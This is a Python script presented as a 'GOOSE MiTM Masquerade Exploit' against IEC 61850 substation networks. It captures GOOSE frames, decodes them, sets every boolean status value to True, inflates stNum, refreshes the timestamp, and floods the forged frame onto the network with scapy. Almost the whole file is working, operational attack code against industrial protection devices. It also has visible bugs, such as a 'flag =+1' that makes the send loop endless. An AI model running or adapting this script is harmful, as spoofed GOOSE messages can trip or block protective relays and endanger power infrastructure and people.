# !/usr/share/env python3

import os, sys, datetime, inspect, struct, time, argparse, pyshark
import numpy as np
from struct import *
from time import sleep
from copy import deepcopy
from warnings import filterwarnings
filterwarnings("ignore")

from pyasn1.codec.ber import decoder
from pyasn1.codec.ber import encoder
from pyasn1.type import char
from pyasn1.type import tag
from pyasn1.type import univ
from scapy.layers.l2 import Ether
from scapy.layers.l2 import Dot1Q
from scapy.compat import raw
from scapy.utils import hexdump
from scapy.utils import wrpcap
from scapy.all import rdpcap
from scapy.all import sendp

networkInterface = "eth1"
filter_string = "ether proto 0x88B8 and len <= 200"
GOOSE_TYPE = 0x88b8


# We have to tell script where to find the Goose module in parent directory

currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)


from goose.goose import GOOSE
from goose.goose import GOOSEPDU
from goose.goose_pdu import AllData
from goose.goose_pdu import Data
from goose.goose_pdu import IECGoosePDU
from goose.goose_pdu import UtcTime

if len(sys.argv) < 2:
    print('[-] For help menu, use -h')
    sys.exit(1)

less_indent_formatter = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=8)

parser = argparse.ArgumentParser(description='GOOSE MiTM Masquerade Exploit.', formatter_class=less_indent_formatter, usage='python3 %(prog)s [options]')
parser.add_argument('--pcapfile', help='Name of the PCAP file to process.')
parser.add_argument('--livecapture', action='store_true', help='Start the live capture. (default: %(default)s)')
parser.add_argument('--output', help="""Name of the ouput file (should be with .pcap extension)
Example: 
----------
    python3 %(prog)s --livecapture --output <filename>
""")
args = parser.parse_args()

if args.pcapfile:
    packets = rdpcap(args.pcapfile)

# This function will be used with importing pyshark library for live capturing the packets and create a pcap file
if args.livecapture:
    try:
        print(f"[+] Listening on {networkInterface}"); sleep(2)
        print("[+] YOU SHOULD HAVE SUDO PERMISSIONS TO DO THIS")
        count = int(input('How many packets do you want to capture?: '))
        print("[+] Capturing packets...")
        captureLive = pyshark.LiveCapture(
                interface=networkInterface, 
                bpf_filter=filter_string,
                output_file=args.output
        )

        #captureLive.set_debug()
        captureLive.sniff(packet_count=count)
        captureLive.close()
        print("[+] Capturing done..")
        print("[+] Using the pcap file just captured..")
        packets = rdpcap(args.output)

    except KeyboardInterrupt:
        print('\n[-] Exiting')
        sys.exit(1)



# CONVERTING THE TIME INTO 64-BITS or 8-BYTES FORM
UTC = 1 # 0: local time 1: UTC Time
def curTime64Bits(utc=False):
    # Microsecond Resolution Ignored
    if UTC:
        curTime = time.mktime(datetime.datetime.utcnow().timetuple())
    else:
        curTime = time.mktime(datetime.datetime.now().timetuple())

    curTimeInt = int(curTime)
    curTimeInt64 = (curTimeInt << 32)
    curTimeInt64Str = curTimeInt64.to_bytes(8,'big')
    return curTimeInt64Str


# This function will check whether the packets is a GOOSE packet or not
def goose_check(packet):
    isGoose = False
    # Test for a Goose Ether Type
    if packet.haslayer('Dot1Q'):
        if packet['Dot1Q'].type == GOOSE_TYPE: isGoose = True
    if packet.haslayer('Ether'):
        if packet['Ether'].type == GOOSE_TYPE: isGoose = True
    return isGoose

# This function will print all the ANS.1 decoded GOOSE PDU data 
def gooseASN1_DataPrint(data):
    print('\n\n')
    for field in list(IECGoosePDU()):
        if not data[field].hasValue():
            continue
        if type(data[field]) == char.VisibleString:
            print('%s: %s'%(field,str(data[field])))
            continue
        if type(data[field]) == univ.Integer:
            print('%s: %s'%(field,int(data[field])))
            continue
        if type(data[field]) == UtcTime:
            print('%s: %s'%(field,datetime.datetime.fromtimestamp(int.from_bytes(bytearray(data[field])[:4],'big')).strftime('%Y-%m-%d %H:%M:%S')))
            continue
        if type(data[field]) == univ.Boolean:
            print('%s: %s'%(field,str(data[field])))
            continue
        if type(data[field]) == AllData:
            print('%s'%(field))
            for field in data.getComponentByName('allData'):
                for value in field.values():
                    print('    %s'%(value))
            continue
        if type(data[field]) == univ.OctetString:
            print('%s: %s'%(field,str(data[field])))
            continue

# This function will decode the GOOSE PDU header using ASN.1 decoding 
def gooseAllData_decode(encoded_data):
    g = IECGoosePDU().subtype(
        implicitTag=tag.Tag(
            tag.tagClassApplication,
            tag.tagFormatConstructed,
            1
        )
    )

    decoded_data, unprocessed_trail = decoder.decode(
        encoded_data,
        asn1Spec=g
    )

    return decoded_data


### PARSING THE GOOSE AND GOOSE PDU HEADERS ###

print("[+] Parsing GOOSE header and GOOSE PDU header"); sleep(1)
print("[+] Decoding the GOOSE PDU header"); sleep(1)

datSetList = []
g_packets = []
for packet in packets:
    if goose_check(packet):
        # Appending/Storing the packets into a array/list
        g_packets.append(packet)

        # Parse the GOOSE header and GOOSE PDU header
        data = GOOSE(packet.load)

        # Grab the Goose PDU for processing
        goose_pdu = data[GOOSEPDU].original

        # Use PYASN1 to parse the Goose PDU
        goose_decoded = gooseAllData_decode(goose_pdu)

        # Creating a list of datSet
        datSetList.append(str(goose_decoded['datSet']))

# Calling the printing function which will print the decoded GOOSE values
perm = input("Do you want to print the packets?[Y/N]: ")
mod_g_packets = g_packets[0:10]
try:
    if perm in ['y', 'Y']:
        print("[+] Printing the packet details...\n"); sleep(2)
        for i in mod_g_packets:
            d = GOOSE(i.load)
            pdu = d[GOOSEPDU].original
            decode = gooseAllData_decode(pdu)
            gooseASN1_DataPrint(decode)
    elif perm in ['n','N']:
        print("Okay, nvm!\n")
    else:
        print('Invalid Input\n')

except KeyboardInterrupt:
    print('[-] Exiting')


# TODO Write the logic for printing the scanned destination IEDs and ask the user to attack on which one


# SELECTING THE PACKET TO BE MODIFIED
print("[+] Select the packet you want to manipulate.")
try:
    for value in range(len(datSetList)):
        print(f"[{value}]: {datSetList[value]}")
    packet_no = int(input("Select number: "))
except KeyboardInterrupt:
    print('[-] Exiting')



# MODIFYING THE PACKETS
true_value = Data()
false_value = Data()
true_value.setComponentByName('boolean', True)
false_value.setComponentByName('boolean', False)

# NOW CREATING A COPY OF A PACKET ON THE BASIS OF THE USER SELECTION
user_packet = g_packets[packet_no]
mod_packet = user_packet.copy()

# EXTRACTING THE GOOSE HEADER (8 Bytes: APPID, Length, Reserved 1, Reserved 2)
mod_packet_load_start_goose = mod_packet.load[:8] 

# EXTRACTING THE allData PAYLOAD FROM THE END (6 bytes)
mod_packet_load_end_alldata = mod_packet.load[-6:]

# PARSE THE GOOSE PACKET FOR DEBUGGING PURPOSE
user_data = GOOSE(user_packet.load)
user_pdu = user_data[GOOSEPDU].original
user_pdu_decode = gooseAllData_decode(user_pdu)

# PARSE THE GOOSE PACKET FOR MODIFICATION
mod_data = GOOSE(mod_packet.load)
mod_pdu = mod_data[GOOSEPDU].original
mod_pdu_decode = gooseAllData_decode(mod_pdu)

# MODIFYING THE SQNUM AND STNUM PACKETS
tmpSQNUM = mod_pdu_decode.getComponentByName('sqNum')
tmpSTNUM = mod_pdu_decode.getComponentByName('stNum')

# UPDATING THE BOOLEAN VALUES IN THE GOOSEPDU HEADER

for value in range(mod_pdu_decode['numDatSetEntries']):
    if mod_pdu_decode['allData'].getComponentByPosition(value) == False:
        mod_pdu_decode['allData'].setComponentByPosition(value, true_value)
        continue
    elif mod_pdu_decode['allData'].getComponentByPosition(value) == True:
        mod_pdu_decode['allData'].setComponentByPosition(value, true_value)
        continue

# INCREMENT THE STNUM VALUE 
mod_pdu_decode.setComponentByName('stNum', (int(tmpSTNUM))+9989)

# RESETING THE SQNUM VALUE, note that we will need to increment this or increment stNum and keep this 0
mod_pdu_decode.setComponentByName('sqNum', 50) 

# WE ALSO HAVE TO CHANGE THE TIMESTAMP WITH THE CURRENT ONE, AND THE TIME SHOULD BE IN 64 BITS
new_time = curTime64Bits()
mod_pdu_decode.setComponentByName('t',new_time)

# ENCODED THE MODIFIED DATA (ASN.1/BER)
encoded_data = encoder.encode(mod_pdu_decode)
print("\n\n" + "#"*30)
print(f"GOOSE ENCODED DATA: {encoded_data}")
print("#"*30)
print("\n\n")

# REBUILD THE MOD PACKET (GOOSE HEADER + MODIFIED PAYLOAD + REMAINING DATA STRUCTURE)
mod_packet.load = mod_packet_load_start_goose + encoded_data #+ mod_packet_load_end_alldata


# PRINTING THE ORIGINAL AND MODIFIED PACKET AND FRAMES:
debug = input("Do you want to print the modified data?[Y/N]?: ")
if debug in ['y', 'Y']:
    print("#"*30)
    print("Original Data: ")
    print("#"*30)
    gooseASN1_DataPrint(user_pdu_decode)

    print("\n\n" + "#"*30)
    print("Original Frame: ")
    print("#"*30)
    user_packet.show()

    print("#"*30)
    print("Modified Data: ")
    print("#"*30)
    gooseASN1_DataPrint(mod_pdu_decode)

    print("\n\n" + "#"*30)
    print("Modified Frame:")
    print("#"*30)
    mod_packet.show()

elif debug in ['n', 'N']:
    print("[+] Moving on to the exploit..")



attack_choice = input("Are you sure to send the modified packet? (time will be changed)[Y/N]: ")
if attack_choice in ['y', 'Y']:
    try:
        # SENDING THE FRAMES AT HIGH FREQUENCY
        print('[+] Sending malicious packets...')
        flag = 0
        while(flag < 1000):
            sendp(mod_packet, iface=networkInterface)
            flag =+1
    except KeyboardInterrupt:
        print("[-] Stopping the injection...")

elif attack_choice in ['n', 'N']:
    try:
        print('[+] Saving the modified packets in pcapng file..')
        wrpcap('mod_goose_packets.pcapng', mod_packet, append=True)

    except KeyboardInterrupt:
        print("[-] Exiting!")
